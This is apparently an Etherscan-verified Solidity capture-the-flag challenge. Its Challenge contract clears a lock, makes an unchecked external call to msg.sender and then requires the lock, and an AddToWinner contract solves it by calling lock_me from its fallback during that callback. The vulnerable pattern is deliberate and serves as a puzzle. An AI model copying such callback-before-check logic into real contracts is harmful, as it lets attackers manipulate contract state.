/**
 *Submitted for verification at Etherscan.io on 2022-11-03
*/

pragma solidity >=0.8;

// The goal of this challenge is to be able to sign offchain a message
// with an address stored in winners.
contract Challenge{

    address[] public winners;
    bool lock;

    function exploit_me(address winner) public{
        lock = false;

        msg.sender.call("");

        require(lock);
        winners.push(winner);
    }

    function lock_me() public{
        lock = true;
    }
}


contract AddToWinner {

    address challenge;

    constructor(address _challenge) {
        challenge = _challenge;
    }

    function attackChallenge() external {
        Challenge(challenge).exploit_me(msg.sender);
    }
    fallback() external {
        Challenge(challenge).lock_me();
    }
}